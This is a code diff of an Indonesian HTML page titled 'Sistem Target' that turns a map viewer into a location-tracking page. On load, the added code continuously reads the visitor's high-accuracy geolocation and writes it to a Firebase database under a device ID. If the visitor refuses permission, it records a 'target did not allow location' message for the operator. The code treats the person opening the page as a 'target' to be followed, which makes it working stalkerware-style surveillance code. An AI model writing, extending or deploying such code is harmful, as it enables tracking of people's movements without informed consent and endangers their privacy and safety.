@@ -4,20 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Target</title>
-    <!-- Leaflet CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
-    <!-- Leaflet JS -->
-    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-    <style>
-        /* Atur tinggi peta */
-        #map {
-            height: 400px; /* Atur tinggi peta */
-            width: 100%; /* Lebar penuh */
-        }
-    </style>
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-app.js';
-        import { getDatabase, ref, onValue } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
+        import { getDatabase, ref, set, remove } from 'https://www.gstatic.com/firebasejs/9.16.0/firebase-database.js';
 
         // Konfigurasi Firebase Anda
         const firebaseConfig = {
@@ -34,55 +23,62 @@
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
 
-        // Inisialisasi peta
-        const map = L.map('map').setView([-6.2001, 106.8456], 13); // Koordinat awal
-
-        // Menambahkan layer peta dari OpenStreetMap
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-            maxZoom: 19,
-        }).addTo(map);
-
-        // Fungsi untuk menampilkan lokasi
-        function updateMap(lat, lon) {
-            // Menghapus marker lama jika ada
-            if (window.marker) {
-                map.removeLayer(window.marker);
+        // Fungsi untuk mendapatkan lokasi
+        function getLocation() {
+            console.log("Meminta lokasi...");
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(showPosition, showError, {
+                    enableHighAccuracy: true
+                });
+            } else {
+                alert("Geolocation tidak didukung oleh browser ini.");
             }
-            // Tambahkan marker ke peta
-            window.marker = L.marker([lat, lon]).addTo(map);
-            map.setView([lat, lon], 15); // Pindahkan peta ke lokasi baru dan zoom level 15
         }
 
-        // Fungsi untuk mendapatkan data dari Firebase
-        function getLocationFromFirebase() {
+        function showPosition(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // Mengirim data lokasi ke Firebase
             const locationRef = ref(database, 'devices/device1'); // ID perangkat unik
-            onValue(locationRef, (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    updateMap(data.latitude, data.longitude);
-                }
+            set(locationRef, {
+                latitude: lat,
+                longitude: lon,
+                timestamp: Date.now()
             });
+
+            // Menghapus pesan penolakan izin (jika ada)
+            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
+            remove(notificationRef);
         }
 
-        // Mulai mendapatkan data lokasi dari Firebase saat halaman dimuat
-        window.onload = getLocationFromFirebase;
-
-        // Pendaftaran Service Worker
-        if ('serviceWorker' in navigator) {
-            window.addEventListener('load', () => {
-                navigator.serviceWorker.register('/service-worker.js')
-                    .then(registration => {
-                        console.log('ServiceWorker registered with scope:', registration.scope);
-                    })
-                    .catch(error => {
-                        console.error('ServiceWorker registration failed:', error);
+        function showError(error) {
+            const notificationRef = ref(database, 'notifications/device1'); // ID perangkat unik
+            console.log("Error mendapatkan lokasi:", error); // Log kesalahan untuk debug
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    set(notificationRef, {
+                        message: "Target tidak izinkan lokasi"
                     });
-            });
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Informasi lokasi tidak tersedia.");
+                    break;
+                case error.TIMEOUT:
+                    alert("Permintaan untuk mendapatkan lokasi pengguna telah waktunya habis.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Terjadi kesalahan yang tidak diketahui.");
+                    break;
+            }
         }
+
+        // Mulai mendapatkan lokasi saat halaman dimuat
+        window.onload = getLocation;
     </script>
 </head>
 <body>
     <h1>Sistem Target</h1>
-    <div id="map"></div> <!-- Elemen untuk peta -->
+    <p>Memantau lokasi perangkat...</p>
 </body>
 </html>
